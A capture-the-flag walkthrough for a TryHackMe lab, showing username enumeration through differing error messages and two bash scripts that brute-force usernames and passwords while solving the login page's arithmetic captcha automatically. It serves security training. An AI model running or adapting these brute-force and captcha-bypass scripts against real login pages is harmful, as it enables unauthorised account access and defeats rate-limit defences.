# TryHackMe Capture Full Walkthrough

## Topics

- **authentication bypass**  
- **captcha bypass**
- **Scripting**

## Login page enumeration

Navigating to the site we are presented with a login page: 

![image](https://github.com/user-attachments/assets/f334ea32-66cf-4e46-80f3-d2dfba265526)

Lets put in some values in the input fields and see what sort of error message we get:

![image](https://github.com/user-attachments/assets/e0ddb161-76d2-4aa3-a975-98d618755a9a)

We can see here that the username field is vulnerable to username enumeration. This means that if we input the correct username it should give us a different error message. But we cannot just brute force the field with usernames.txt as the challenge states there is rate limiting involved.

This can be tested and seen if we enter the random values into the username and password fields several time. We will eventually end up with a captcha that looks something like this: 

![image](https://github.com/user-attachments/assets/8bed5783-47b4-4fc8-bacd-090977a8a6c9)

Once we solve the captcha then we get the same error message we got before:

![image](https://github.com/user-attachments/assets/f9f38a43-b2dc-412d-a822-584efb7e4940)

However, the mathematical problem is now different. So essentially for each username we brute force from our usernames.txt we will face a different mathematical problem each time that we need solve each time. So how can we speed things up?

## Scripting

We will need to write a script that can essentially brute force the username field with usernames.txt and solve the captcha fields for every single request we make. Lets call upon our friend ChatGPT to do this for us.

userenum script:

```bash
#!/bin/bash

# Loop through each username in the usernames.txt file
while IFS= read -r username
do
  # Fetch the HTML response for the username
  response=$(curl -s -X POST -d "username=$username&password=x" http://10.10.37.22/login)

  # Extract the CAPTCHA math question from the HTML
  captcha_question=$(echo "$response" | grep -oP '\d+ [\+\-\*/] \d+')

  # Extract the first number, operator, and second number from the CAPTCHA question
  num1=$(echo "$captcha_question" | awk '{print $1}')
  operator=$(echo "$captcha_question" | awk '{print $2}')
  num2=$(echo "$captcha_question" | awk '{print $3}')

  # Solve the CAPTCHA
  if [ "$operator" == "+" ]; then
    captcha_answer=$((num1 + num2))
  elif [ "$operator" == "-" ]; then
    captcha_answer=$((num1 - num2))
  elif [ "$operator" == "*" ]; then
    captcha_answer=$((num1 * num2))
  elif [ "$operator" == "/" ]; then
    captcha_answer=$((num1 / num2))
  fi

  # Send the POST request with the solved CAPTCHA
  response=$(curl -s -X POST -d "username=$username&password=admin&captcha=$captcha_answer" http://10.10.37.22/login)

  # Check if the user exists or not
  if echo "$response" | grep -q "The user &#39;$username&#39; does not exist"; then
    echo "User $username does not exist"
  else
    echo "Found valid user: $username"
    break
  fi
done < usernames.txt
```
Running this script we can find our valid username:

![image](https://github.com/user-attachments/assets/e770a6c4-5583-476d-972d-b47696b2dc11)

Now we just need to do the exact same thing but for the password field.

![image](https://github.com/user-attachments/assets/d87b23a0-d264-4de7-9bfe-fc117682d3a6)

We can see from the error message we have the correct username. We can re-use our script but just tweak it a bit to make it work for password. Doing this we get the following:

Password script

```bash
#!/bin/bash

# Loop through each password in the passwords.txt file
while IFS= read -r password
do
  # Fetch the HTML response for the password
  response=$(curl -s -X POST -d "username=natalie&password=$password" http://10.10.37.22/login)

  # Extract the CAPTCHA math question from the HTML
  captcha_question=$(echo "$response" | grep -oP '\d+ [\+\-\*/] \d+')

  # Extract the first number, operator, and second number from the CAPTCHA question
  num1=$(echo "$captcha_question" | awk '{print $1}')
  operator=$(echo "$captcha_question" | awk '{print $2}')
  num2=$(echo "$captcha_question" | awk '{print $3}')

  # Solve the CAPTCHA
  if [ "$operator" == "+" ]; then
    captcha_answer=$((num1 + num2))
  elif [ "$operator" == "-" ]; then
    captcha_answer=$((num1 - num2))
  elif [ "$operator" == "*" ]; then
    captcha_answer=$((num1 * num2))
  elif [ "$operator" == "/" ]; then
    captcha_answer=$((num1 / num2))
  fi

  # Send the POST request with the solved CAPTCHA
  response=$(curl -s -X POST -d "username=natalie&password=$password&captcha=$captcha_answer" http://10.10.37.22/login)

  # Check if the password exists or not
  if echo "$response" | grep -q "Invalid password for user &#39;natalie&#39;"; then
    echo "password $password does not exist"
  else
    echo "Found valid password: $password"
    break
  fi
done < passwords.txt
```


Running this we get the password:

![image](https://github.com/user-attachments/assets/7bf27dc4-1222-4d49-9ee8-3ed4f4d58879)

Now we can login and obtain our flag:


![image](https://github.com/user-attachments/assets/d27caa47-a299-45c0-ab43-a29083412be2)

Note you may need to run the following command a few times if it does not work.

```sh
curl -X POST -d 'username=admin&password=admin&captcha=405' http://10.10.131.181/login
```

















